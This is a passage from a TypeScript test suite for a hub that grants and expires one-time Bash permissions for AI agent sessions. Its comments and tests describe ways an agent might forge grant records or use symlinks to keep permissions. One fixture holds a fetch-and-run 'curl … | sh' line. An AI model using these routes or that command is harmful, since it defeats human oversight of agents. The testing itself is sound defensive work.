    const settingsOf = (): JsonObject => asObject(JSON.parse(readFileSync(target, "utf8"))) ?? {};

    beforeEach(() => {
      // A temp HOME whose settings.json is a link into a dotfiles checkout, as on Luiz's machines: never the real one.
      home = join(base, "home");
      target = join(base, "dotfiles", "claude", "settings.json");
      mkdirSync(join(home, ".claude"), { recursive: true });
      mkdirSync(join(base, "dotfiles", "claude"), { recursive: true });
      writeFileSync(target, `${JSON.stringify({ model: "opus", autoMode: { allow: ["$defaults", "K18"], soft_deny: ["x"] } }, null, 2)}\n`);
      symlinkSync(target, join(home, ".claude", "settings.json"));
      env = { ...env, HOME: home };
      withRows(ruleCard());
    });

    test("appends the entry after the others, $defaults first, logs a rule line, and no sweep takes it back", async () => {
      await start();
      const sent = await post(add);
      expect([sent.status, sent.body["grant"]]).toEqual([201, ADDED]);
      expect(settingsOf()).toEqual({ model: "opus", autoMode: { allow: ["$defaults", "K18", ENTRY], soft_deny: ["x"] } });
      expect(lstatSync(join(home, ".claude", "settings.json")).isSymbolicLink()).toBe(true);
      const sha256 = new Bun.CryptoHasher("sha256").update(ENTRY).digest("hex");
      const [line, ...more] = grants();
      expect(more).toEqual([]);
      expect(Object.keys(line ?? {})).toEqual(["op", "decision", "file", "sha256", "at", "by"]);
      expect([line?.["op"], line?.["decision"], line?.["file"], line?.["sha256"]]).toEqual(["rule", "r-forget", target, sha256]);
      await running?.hub.expireGrants();
      expect(settingsOf()).toEqual({ model: "opus", autoMode: { allow: ["$defaults", "K18", ENTRY], soft_deny: ["x"] } });
    });

    test("an identical entry is not added again", async () => {
      writeFileSync(target, `${JSON.stringify({ autoMode: { allow: ["$defaults", ENTRY] } }, null, 2)}\n`);
      await start();
      const sent = await post(add);
      expect([sent.status, sent.body["grant"]]).toEqual([201, `${ADDED} It was there already: nothing was added.`]);
      expect(settingsOf()).toEqual({ autoMode: { allow: ["$defaults", ENTRY] } });
    });

    test("Not now writes nothing; a rule the page did not show, or a header-less loopback post, adds nothing", async () => {
      await start();
      const deny = await post({ text: "deny: Not now", decision: "r-forget" });
      expect(deny.status).toBe(201);
      const changed = await post({ ...add, rule_text: "something else" });
      expect([changed.status, changed.body["error"]]).toEqual([409, "the page showed another rule than the one D7 holds now: reload the page, read it, and answer again"]);
      const bare = await request("POST", "/f/p/chat", JSON.stringify(add), { "Content-Type": "application/json" });
      expect([bare.status, bare.body["error"]]).toEqual([403, "a grant comes only from the fleet's own page on this hub: answer it there"]);
      expect(settingsOf()).toEqual({ model: "opus", autoMode: { allow: ["$defaults", "K18"], soft_deny: ["x"] } });
      expect(grants()).toEqual([]);
    });

    test("a rule card whose entry is a bad shape adds nothing", async () => {
      withRows(ruleCard({ rule: "`jj workspace forget *`" }));
      await start();
      const sent = await post({ ...add, rule_text: "`jj workspace forget *`" });
      expect(sent.status).toBe(409);
      expect(String(sent.body["error"])).toContain("D7's rule cannot be added");
      expect(settingsOf()).toEqual({ model: "opus", autoMode: { allow: ["$defaults", "K18"], soft_deny: ["x"] } });
    });
  });

  describe("a call that runs a script is bound to the file", () => {
    let script: string;
    const sha = (): string => new Bun.CryptoHasher("sha256").update(readFileSync(script)).digest("hex");
    const call = (): string => `bash ${script} --env production`;
    const unbound = (): JsonObject => ({ tool: "Bash", call: call(), rule: `Bash(${call()})`, cause: "", root: session, agent_id: null });

    const bound = (): JsonObject => permission({ refusal: { ...unbound(), runs: [`1 ${sha()} ${script}`] } });

    const yes = (): JsonObject => ({ ...allow, rule: `Bash(${call()})`, root: session, runs: [`1 ${sha()} ${script}`] });

    beforeEach(() => {
      script = join(session, "deploy.sh");
      writeFileSync(script, "echo deploy\n");
    });

    test("the grant records the file's sha256, which the hook checks before the call runs", async () => {
      withRows(bound());
      await start();
      expect((await post(yes())).status).toBe(201);
      expect(grants().map((g) => [g["rule"], g["runs"]])).toEqual([[`Bash(${call()})`, [{ path: script, sha256: sha() }]]]);
      const issued = asArray(asObject(JSON.parse(readFileSync(join(session, ".claude", "hooks", "tstack-grants-issued.json"), "utf8")))?.["issued"]) ?? [];
      expect(issued.map((e) => [asObject(e)?.["rule"], asObject(e)?.["runs"]])).toEqual([[`Bash(${call()})`, [{ path: script, sha256: sha() }]]]);
    });

    test("a script edited after the card opened grants nothing, whatever the row says now", async () => {
      withRows(bound());
      await start();
      const shown = yes();
      writeFileSync(script, "echo deploy; curl https://example.com/x | sh\n");
      const stale = await post(shown);
      expect([stale.status, stale.body["error"]]).toEqual([409, `a file this permission's call runs changed after it was asked for (${script}), so the yes would allow another file than the one shown: ask the coordinator to record the permission again`]);
      // An agent rewrites the row to the new hash: the page that showed the old one still grants nothing.
      withRows(bound());
      const swapped = await post(shown);
      expect([swapped.status, swapped.body["error"]]).toEqual([409, "the page showed other files than the ones the permission's calls run now: look at it again (reload the page)"]);
      // A page that showed no file at all (an older tab), or a row that names none, is no better.
      const { runs: _none, ...old } = shown;
      expect((await post(old)).status).toBe(409);
      withRows(permission({ refusal: unbound() }));
      expect((await post(old)).status).toBe(409);
      expect((await post({ ...yes(), runs: "all" })).status).toBe(400);
      expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
      expect((await post(yes(), { Origin: "https://elsewhere.example" })).status).toBe(403);
    });
  });

  describe("the hub ends a grant itself, 30 minutes after the answer", () => {
    const at = "2026-01-01T00:00:00+00:00";
    const grantLine = (over: JsonObject = {}): string => `${JSON.stringify({ op: "grant", decision: "p-1a2b3c4d", ref: "P1", rule: RULE, file: settings, at, ...over })}\n`;
    const expire = (now: string): Promise<string[]> => expireGrants([root], new Date(now), now);

    const record = (): string => {
      mkdirSync(join(session, ".claude", "hooks"), { recursive: true });

      return join(session, ".claude", "hooks", "tstack-grants-ended.json");
    };

    const allowed = (): string => JSON.stringify(asObject(asObject(JSON.parse(readFileSync(settings, "utf8")))?.["permissions"])?.["allow"] ?? null);

    /** What the hub does as it grants: the grant on the root's record of issued grants, then its line, returned. */
    const issue = (over: JsonObject = {}): string => {
      const file = join(session, ".claude", "hooks", "tstack-grants-issued.json");
      mkdirSync(dirname(file), { recursive: true });
      const held = existsSync(file) ? (asArray(asObject(JSON.parse(readFileSync(file, "utf8")))?.["issued"]) ?? []) : [];
      writeFileSync(file, JSON.stringify({ issued: [...held, { decision: "p-1a2b3c4d", ref: "P1", rule: RULE, file: settings, at, n: 1, of: 1, ...over }] }));

      return grantLine(over);
    };

    test("not before; then the rule goes, the rest stays, and the removal is recorded", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)", RULE], deny: ["Bash(rm)"] }, model: "opus" }));
      writeFileSync(join(root, "grants.jsonl"), issue());
      expect(await expire("2026-01-01T00:29:59+00:00")).toEqual([]);
      expect(allowed()).toBe(JSON.stringify(["Bash(ls)", RULE]));
      expect(await expire("2026-01-01T00:30:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: ["Bash(ls)"], deny: ["Bash(rm)"] }, model: "opus" });
      expect(grants().at(-1)).toEqual({ op: "remove", decision: "p-1a2b3c4d", rule: RULE, file: settings, at: "2026-01-01T00:30:00+00:00", why: "expired", by: "hub" });
      // The take-back on record beside the settings, where an agent can no more write than the rules themselves.
      expect(JSON.parse(readFileSync(record(), "utf8"))).toEqual({ ended: [{ file: settings, decision: "p-1a2b3c4d", rule: RULE, granted: at, at: "2026-01-01T00:30:00+00:00", why: "expired" }] });
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([]);
      expect(grants().length).toBe(2);
      expect(existsSync(join(session, ".claude", ".settings.local.json.lock"))).toBe(false);
    });

    test("a grant whose line was deleted is found on its root's record, by a restarted hub too (measured on 83448844: taken: [])", async () => {
      // The root is named by the fleet's heartbeat (beforeEach), not by any line; expireGrants reads no memory of this process's grants here.
      writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)", RULE] } }));
      issue();
      writeFileSync(join(root, "grants.jsonl"), "");
      expect(await expire("2026-01-01T00:29:59+00:00")).toEqual([]);
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(allowed()).toBe(JSON.stringify(["Bash(ls)"]));
    });

    test("a crash after the record and before the rule leaves an entry that grants nothing, and one after the rule a grant the expiry ends", async () => {
      issue();
      writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)"] } }));
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([]);
      writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)", RULE] } }));
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([`${RULE} in ${settings}`]);
    });

    /** An allow-once of the row's permission, answered at `at`. */
    const answer = (over: Partial<Answered> = {}): Answered => ({ dir: root, decision: "p-1a2b3c4d", text: "allow-once: Allow this call once", rule: RULE, rules: undefined, root: session, runs: undefined, by: "local", at, registered: () => undefined, home: undefined, ...over });

    test("a hub that dies after the rule and before the line leaves a grant a restarted hub takes back at its 30 minutes", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)"] } }));
      // The process dies as it appends the line: nothing it writes after lands, its rollback and its lock's release included.
      const real = { ...fs };
      let [armed, dead] = [true, false];

      const dies =
        <A extends never[], R>(write: (...args: A) => R) =>
        (...args: A): R => {
          if (dead) throw new Error("the hub died");

          return write(...args);
        };

      const append = (...args: Parameters<typeof fs.appendFileSync>): void => {
        if (armed && String(args[0]).endsWith("grants.jsonl")) [armed, dead] = [false, true];

        if (dead) throw new Error("the hub died");
        real.appendFileSync(...args);
      };

      void mock.module("node:fs", () => ({ ...real, appendFileSync: append, writeFileSync: dies(real.writeFileSync), renameSync: dies(real.renameSync), rmSync: dies(real.rmSync), rmdirSync: dies(real.rmdirSync), mkdirSync: dies(real.mkdirSync), chmodSync: dies(real.chmodSync), unlinkSync: dies(real.unlinkSync) }));

      try {
        await grantAnswer(answer()).then(
          () => expect.unreachable("the hub was to die at the line"),
          (cause: unknown) => expect(String(cause)).toContain("the hub died"),
        );
      } finally {
        [armed, dead] = [false, false];
        // node:fs as it was, for the tests after this one and the files after this one in a whole run.
        void mock.module("node:fs", () => real);
      }

      expect((await import("node:fs")).writeFileSync).toBe(real.writeFileSync);

      // The entry and the rule landed, the line did not.
      expect(allowed()).toBe(JSON.stringify(["Bash(ls)", RULE]));
      expect((asArray(asObject(JSON.parse(readFileSync(join(session, ".claude", "hooks", "tstack-grants-issued.json"), "utf8")))?.["issued"]) ?? []).map((e) => asObject(e)?.["at"])).toEqual([at]);
      expect(grants()).toEqual([]);
      // Restarted 31 minutes on: its lock is stale by then, and the fleet's heartbeat names the root.
      const lock = join(session, ".claude", ".settings.local.json.lock");

      if (existsSync(lock)) utimesSync(lock, new Date(Date.now() - 31 * 60_000), new Date(Date.now() - 31 * 60_000));
      expect(await expire("2026-01-01T00:29:59+00:00")).toEqual([]);
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(allowed()).toBe(JSON.stringify(["Bash(ls)"]));
    });

    test("an entry on another root's record grants nothing here: a line naming that root keeps no grant past its 30 minutes", async () => {
      // Review 2, finding 2: the record of a folder an agent made, named by a line read after the session root's, held an
      // entry naming the session's settings with a later `at`, and it replaced the session root's own entry.
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      const fake = join(base, "fake", ".claude");
      mkdirSync(join(fake, "hooks"), { recursive: true });
      writeFileSync(join(fake, "hooks", "tstack-grants-issued.json"), JSON.stringify({ issued: [{ decision: "p-1a2b3c4d", ref: "P1", rule: RULE, file: settings, at: "2026-01-01T00:20:00+00:00", n: 1, of: 1 }] }));
      writeFileSync(join(root, "grants.jsonl"), issue() + grantLine({ decision: "p-x", rule: "Bash(x)", file: join(fake, "settings.local.json") }));
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(allowed()).toBe(JSON.stringify([]));
    });

    /** The real grant on record (rev r1), and an agent's folder `fake` whose settings hold RULE. */
    const fakeRoot = (): string => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      const fake = join(base, "fake", ".claude");
      mkdirSync(fake, { recursive: true });
      writeFileSync(join(fake, "settings.local.json"), JSON.stringify({ permissions: { allow: [RULE] } }));

      return issue({ rev: "r1" });
    };

    const fakeAllowed = (file: string): string => JSON.stringify(asObject(asObject(JSON.parse(readFileSync(file, "utf8")))?.["permissions"])?.["allow"] ?? null);

    test("a take-back through a symlinked .claude/hooks lands on no record: the real grant still ends at its 30 minutes", async () => {
      // Review 3, finding 1, path (a): a line naming the agent's folder, its hooks a symlink to the root's, with the real
      // grant's decision, at and rev. Its take-back went onto the root's record and ended the real grant, for good.
      const line = fakeRoot();
      symlinkSync(join(session, ".claude", "hooks"), join(base, "fake", ".claude", "hooks"));
      writeFileSync(join(root, "grants.jsonl"), line + grantLine({ rev: "r1", file: join(base, "fake", ".claude", "settings.local.json") }));
      expect(await expire("2026-01-01T00:01:00+00:00")).toEqual([]);
      expect(existsSync(record())).toBe(false);
      expect(fakeAllowed(join(base, "fake", ".claude", "settings.local.json"))).toBe(JSON.stringify([RULE]));
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(allowed()).toBe(JSON.stringify([]));
    });

    test("a grant file named through link/.. is no grant file: Node's join reads it by text, the filesystem through the link", async () => {
      // Review 3, finding 1, path (b): `<root>/x/..` with x a symlink. holdsRule and the settings write followed x, to
      // the agent's folder; recordFile normalized the text, to the root's own record.
      const line = fakeRoot();
      mkdirSync(join(base, "fake", "deep"));
      symlinkSync(join(base, "fake", "deep"), join(session, "x"));
      writeFileSync(join(root, "grants.jsonl"), line + grantLine({ rev: "r1", file: `${session}/x/../.claude/settings.local.json` }));
      expect(await expire("2026-01-01T00:01:00+00:00")).toEqual([]);
      expect(existsSync(record())).toBe(false);
      expect(fakeAllowed(join(base, "fake", ".claude", "settings.local.json"))).toBe(JSON.stringify([RULE]));
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([`${RULE} in ${settings}`]);
    });

    test("a line on no record is taken back with a line take-back alone: nothing was issued", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      writeFileSync(join(root, "grants.jsonl"), grantLine({ rev: "r1" }));
      expect(await expire("2026-01-01T00:01:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(JSON.parse(readFileSync(record(), "utf8"))["ended"]).toEqual([{ file: settings, decision: "p-1a2b3c4d", rule: RULE, granted: at, rev: "r1", line: true, at: "2026-01-01T00:01:00+00:00", why: "expired" }]);
    });

    test("an owner's rule identical to a line on no record survives the next sweep: the line's take-back is on record", async () => {
      // Round 4: a line on no record got no take-back, so the owner's identical rule went at every sweep (2026-10-15).
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      writeFileSync(join(root, "grants.jsonl"), grantLine({ rev: "r1" }));
      expect(await expire("2026-01-01T00:01:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      expect(await expire("2026-01-01T01:00:00+00:00")).toEqual([]);
      expect(allowed()).toBe(JSON.stringify([RULE]));
    });

    test("a line take-back never ends a recorded grant: not with its file, decision, rule, at and rev, nor with none of file and rev", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      issue({ rev: "r1" });
      const named = { decision: "p-1a2b3c4d", rule: RULE, granted: at, line: true, at, why: "expired" };
      writeFileSync(record(), JSON.stringify({ ended: [{ file: settings, rev: "r1", ...named }, named] }));
      expect(await expire("2026-01-01T00:29:00+00:00")).toEqual([]);
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(asArray(asObject(JSON.parse(readFileSync(record(), "utf8")))?.["ended"])?.at(-1)).toEqual({ file: settings, decision: "p-1a2b3c4d", rule: RULE, granted: at, rev: "r1", at: "2026-01-01T00:31:00+00:00", why: "expired" });
    });

    test("a take-back missing the file or the rev never ends a recorded grant: it is taken back at its 30 minutes", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      issue({ rev: "r1" });
      const named = { decision: "p-1a2b3c4d", rule: RULE, granted: at, at, why: "used" };
      writeFileSync(record(), JSON.stringify({ ended: [named, { rev: "r1", ...named }, { file: settings, ...named }] }));
      expect(await expire("2026-01-01T00:29:00+00:00")).toEqual([]);
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(asArray(asObject(JSON.parse(readFileSync(record(), "utf8")))?.["ended"])?.at(-1)).toEqual({ file: settings, decision: "p-1a2b3c4d", rule: RULE, granted: at, rev: "r1", at: "2026-01-01T00:31:00+00:00", why: "expired" });
    });

    test("a take-back names its grant file: one of another file's grant ends nothing here", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      issue({ rev: "r1" });
      writeFileSync(record(), JSON.stringify({ ended: [{ file: join(base, "fake", ".claude", "settings.local.json"), decision: "p-1a2b3c4d", rule: RULE, granted: at, rev: "r1", at, why: "expired" }] }));
      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(asArray(asObject(JSON.parse(readFileSync(record(), "utf8")))?.["ended"])?.at(-1)).toEqual({ file: settings, decision: "p-1a2b3c4d", rule: RULE, granted: at, rev: "r1", at: "2026-01-01T00:31:00+00:00", why: "expired" });
    });

    test("a session root whose .claude/hooks is a symlink is granted nothing: no record there can be trusted", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)"] } }));
      mkdirSync(join(base, "elsewhere"));
      symlinkSync(join(base, "elsewhere"), join(session, ".claude", "hooks"));
      expect(await grantAnswer(answer())).toEqual({ refused: expect.stringContaining("symlink") });
      expect(allowed()).toBe(JSON.stringify(["Bash(ls)"]));
      expect(readdirSync(join(base, "elsewhere"))).toEqual([]);
    });

    test("two answers of one decision under two revisions in one second are two grants: the newer one ends at its 30 minutes", async () => {
      // Review 2, finding 3: the take-back's key had no revision, so superseding the first answer's grant ended the
      // second's as it was born, and its rule stayed for good.
      writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)"] } }));
      expect(await grantAnswer(answer())).not.toHaveProperty("refused");
      withRows(permission({ refusal: { ...asObject(permission()["refusal"] ?? null), more: ["git status"] } }));
      expect(await grantAnswer(answer({ text: "allow-once: Allow these 2 calls, once each", rules: [RULE, "Bash(git status)"] }))).not.toHaveProperty("refused");
      const ended = asArray(asObject(JSON.parse(readFileSync(record(), "utf8")))?.["ended"]) ?? [];
      expect(ended.map((e) => [asObject(e)?.["rule"], asObject(e)?.["why"]])).toEqual([[RULE, "superseded"]]);
      expect(await expire("2026-01-01T00:29:59+00:00")).toEqual([]);
      expect((await expire("2026-01-01T00:31:00+00:00")).sort()).toEqual([`Bash(git status) in ${settings}`, `${RULE} in ${settings}`].sort());
      expect(allowed()).toBe(JSON.stringify(["Bash(ls)"]));
    });

    test("only the newest grant of a rule on record counts: an earlier one, and a copy of its line, keep nothing", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      const older = issue({ decision: "p-old", at: "2025-12-31T23:00:00+00:00" });
      issue();
      writeFileSync(join(root, "grants.jsonl"), older);
      expect(await expire("2026-01-01T00:10:00+00:00")).toEqual([]);
      expect(allowed()).toBe(JSON.stringify([RULE]));
    });

    test("a line that says lasting of a session's settings is a one-time grant all the same: any agent can append it", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      writeFileSync(join(root, "grants.jsonl"), grantLine({ lasting: true }));
      expect(await expire("2026-01-01T00:30:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(allowed()).toBe(JSON.stringify([]));
    });

    test("a remove line an agent appended ends nothing: the rule in the file is what stands", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      writeFileSync(join(root, "grants.jsonl"), grantLine() + JSON.stringify({ op: "remove", decision: "p-1a2b3c4d", rule: RULE, file: settings, at, why: "used" }) + "\n");
      expect(await expire("2026-01-01T03:05:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(allowed()).toBe(JSON.stringify([]));
    });

    test("a rule the owner added again after the hook took the grant back is left: the take-back is on record in .claude", async () => {
      // Measured 2026-10-15: the chat watch's lasting rule, byte-identical to a grant used the evening before, went at 08:24.
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      writeFileSync(join(root, "grants.jsonl"), grantLine() + JSON.stringify({ op: "remove", decision: "p-1a2b3c4d", rule: RULE, file: settings, at, why: "used" }) + "\n");
      writeFileSync(record(), JSON.stringify({ ended: [{ decision: "p-1a2b3c4d", rule: RULE, granted: at, at }] }));
      expect(await expire("2026-01-01T03:05:00+00:00")).toEqual([]);
      expect(allowed()).toBe(JSON.stringify([RULE]));
      expect(grants().length).toBe(2);
    });

    test("the same decision granted again after its take-back is a grant of its own, and expires", async () => {
      // Decision ids repeat: the hook's _permission_id hashes the caller and the call, and a revision keeps the id.
      const again = "2026-01-01T01:00:00+00:00";
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      writeFileSync(join(root, "grants.jsonl"), grantLine() + JSON.stringify({ op: "remove", decision: "p-1a2b3c4d", rule: RULE, file: settings, at, why: "used" }) + "\n" + grantLine({ at: again }));
      writeFileSync(record(), JSON.stringify({ ended: [{ decision: "p-1a2b3c4d", rule: RULE, granted: at, at }] }));
      expect(await expire("2026-01-01T01:30:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(allowed()).toBe(JSON.stringify([]));
      // Both lines are on no record of issued grants: the second one's rule goes, and its take-back is marked line (review 3).
      expect(JSON.parse(readFileSync(record(), "utf8"))["ended"].map((e: JsonObject) => [e["granted"], e["line"] ?? false])).toEqual([[at, false], [again, true]]);
    });

    test("a grant this hub wrote, taken back with no file and no rev, then added again by the owner, goes once more and is then left", async () => {
      await start();
      expect((await post(allow)).status).toBe(201);
      const granted = String(grants()[0]?.["at"]);
      // Review 4, finding 1: master's hook and hub write no rev and no file, and a session's hook runs master's code
      // until it restarts. Matched on the rest, one such take-back, written through a forged line in a session on
      // master's hook, ended a real recorded grant, and its rule stayed for good. It ends no recorded grant.
      expect(asString(grants()[0]?.["rev"])).toBeDefined();
      writeFileSync(record(), JSON.stringify({ ended: [{ decision: "p-1a2b3c4d", rule: RULE, granted, at: granted }] }));
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      const due = Date.parse(granted) + 30 * 60_000;
      expect(await expireGrants([root], new Date(due), "t")).toContain(`${RULE} in ${settings}`);
      expect(allowed()).toBe(JSON.stringify([]));
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      expect(await expireGrants([root], new Date(due + 60_000), "t")).not.toContain(`${RULE} in ${settings}`);
      expect(allowed()).toBe(JSON.stringify([RULE]));
    });

    test("a later grant of the same rule has its own 30 minutes; a rule nobody granted, or another file, is left", async () => {
      const other = join(base, "notes.json");
      writeFileSync(other, JSON.stringify({ permissions: { allow: [RULE] } }));
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE, "Bash(ls)"] } }));
      writeFileSync(join(root, "grants.jsonl"), issue() + issue({ decision: "p-2", at: "2026-01-01T00:20:00+00:00" }) + grantLine({ decision: "p-3", file: other }) + issue({ decision: "p-4", rule: "Bash(gone)" }));
      expect(await expire("2026-01-01T00:45:00+00:00")).toEqual([]);
      expect(await expire("2026-01-01T00:50:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(allowed()).toBe(JSON.stringify(["Bash(ls)"]));
      expect(JSON.parse(readFileSync(other, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
      expect(grants().filter((g) => g["op"] === "remove").map((g) => g["decision"])).toEqual(["p-2"]);
    });

    test("a copied line with a later at keeps no grant past its 30 minutes: the at on record is the one that counts", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      writeFileSync(join(root, "grants.jsonl"), issue() + grantLine({ at: "2026-01-01T01:00:00+00:00" }));
      expect(await expire("2026-01-01T00:30:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(allowed()).toBe(JSON.stringify([]));
    });

    test("a line on no record of issued grants grants nothing: its rule is taken back at the next sweep", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      writeFileSync(join(root, "grants.jsonl"), grantLine());
      expect(await expire("2026-01-01T00:01:00+00:00")).toEqual([`${RULE} in ${settings}`]);
      expect(allowed()).toBe(JSON.stringify([]));
      expect(grants().at(-1)?.["why"]).toBe("expired");
    });

    test("a copied line with a later at shields no grant this hub wrote", async () => {
      await start();
      expect((await post(allow)).status).toBe(201);
      const [line] = grants();
      const granted = String(line?.["at"]);
      appendFileSync(join(root, "grants.jsonl"), `${JSON.stringify({ ...line, at: new Date(Date.parse(granted) + 3_600_000).toISOString() })}\n`);
      expect(await expireGrants([root], new Date(Date.parse(granted) + 30 * 60_000), "t")).toContain(`${RULE} in ${settings}`);
      expect(allowed()).toBe(JSON.stringify([]));
    });

    test("a grant this hub wrote ends on time though its record was deleted", async () => {
      await start();
      expect((await post(allow)).status).toBe(201);
      const granted = String(grants()[0]?.["at"]);
      rmSync(join(root, "grants.jsonl"));
      expect(await expireGrants([root], new Date(Date.parse(granted) + 29 * 60_000), "t")).toEqual([]);
      expect(allowed()).toBe(JSON.stringify([RULE]));
      // Every grant this process wrote and has not seen end is in its memory, whatever fleet it was for.
      expect(await expireGrants([], new Date(Date.parse(granted) + 30 * 60_000), "t")).toContain(`${RULE} in ${settings}`);
      expect(allowed()).toBe(JSON.stringify([]));
    });

    test("the running hub sweeps the fleets the registry names", async () => {
      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
      writeFileSync(join(root, "grants.jsonl"), grantLine({ at: "2020-01-01T00:00:00+00:00" }));
      await start();

      // The hub sweeps once as it starts; whichever of that sweep and this one gets there first, the rule goes.
      await running?.hub.expireGrants();

      for (let k = 0; k < 100 && allowed() !== "[]"; k++) await Bun.sleep(20);
      expect(allowed()).toBe(JSON.stringify([]));
      expect(grants().at(-1)?.["by"]).toBe("hub");
    });
  });

  test("a piped call is granted nothing: no exact rule clears it", async () => {
    const piped = `${CALL} | tail -n 5`;
    withRows(permission({ refusal: { tool: "Bash", call: piped, rule: `Bash(${piped})`, cause: "c", root: session, agent_id: null } }));
    await start();
    const got = await post({ ...allow, rule: `Bash(${piped})` });
    expect([got.status, got.body["error"]]).toEqual([409, "no grant: no permission for this call: the call has a |, and no exact allow rule clears a piped command"]);
    expect([existsSync(settings), grants()]).toEqual([false, []]);
  });

  test("the hub writes under the settings lock the hook takes: a held one refuses after a wait, a stale one is taken", async () => {
    const lock = join(session, ".claude", ".settings.local.json.lock");
    mkdirSync(lock);
    await start();
    const started = performance.now();
    const held = await post(allow);
    expect(performance.now() - started).toBeGreaterThanOrEqual(2000);
    expect([held.status, asString(held.body["error"])?.includes("lock")]).toEqual([409, true]);
    expect([existsSync(settings), grants(), readChat(root), existsSync(lock)]).toEqual([false, [], [], true]);
    const old = new Date(Date.now() - 11_000);
    utimesSync(lock, old, old);
    expect((await post(allow)).status).toBe(201);
    expect([JSON.parse(readFileSync(settings, "utf8")), existsSync(lock)]).toEqual([{ permissions: { allow: [RULE] } }, false]);
  });

  test("an absent settings file starts empty", async () => {
    await start();
    expect((await post(allow)).status).toBe(201);
    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
  });

  test("a rule already there is someone's own: the hub writes nothing and records no grant, and the answer is stored", async () => {
    const mine = JSON.stringify({ permissions: { allow: [RULE] } });
    writeFileSync(settings, mine);
    await start();
    expect((await post(allow)).status).toBe(201);
    expect([readFileSync(settings, "utf8"), grants(), readChat(root).length]).toEqual([mine, [], 1]);
  });

  test("a session without a .claude folder gets one, and the grant says the session must restart to see it", async () => {
    const fresh = join(base, "fresh");
    mkdirSync(fresh);
    writeFileSync(join(root, "heartbeats", "s2.json"), JSON.stringify({ session: "s2", at: "2026-01-01T00:00:00+00:00", cwd: fresh }));
    withRows(permission({ refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "c", root: fresh, agent_id: null } }));
    await start();
    expect((await post({ ...allow, root: fresh })).status).toBe(201);
    expect(JSON.parse(readFileSync(join(fresh, ".claude", "settings.local.json"), "utf8"))).toEqual({ permissions: { allow: [RULE] } });
    expect(grants()[0]?.["reload"]).toBe("restart");
  });

  test("a session is known by its project directory too, when its shell has moved elsewhere", async () => {
    writeFileSync(join(root, "heartbeats", "s1.json"), JSON.stringify({ session: "s1", at: "2026-01-01T00:00:00+00:00", cwd: join(session, "src"), project: session }));
    await start();
    expect((await post(allow)).status).toBe(201);
    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
  });

  describe("a fleet with no heartbeats is known by its registered session", () => {
    const children: ReturnType<typeof Bun.spawn>[] = [];

    /** A live process in `cwd`, registered as the process the fleet in `root` lives as long as. */
    function registeredIn(cwd: string): number {
      const child = Bun.spawn(["sleep", "60"], { cwd, stdout: "ignore", stderr: "ignore" });
      children.push(child);
      machine(env).registry.register(root, "u", child.pid, "2026-01-01T00:00:00+00:00");

      return child.pid;
    }

    beforeEach(() => {
      rmSync(join(root, "heartbeats"), { recursive: true, force: true });
    });

    afterEach(() => {
      for (const child of children.splice(0)) child.kill();
    });

    test("the registry's live process for this fleet runs in the root: granted", async () => {
      registeredIn(session);
      await start();
      expect((await post(allow)).status).toBe(201);
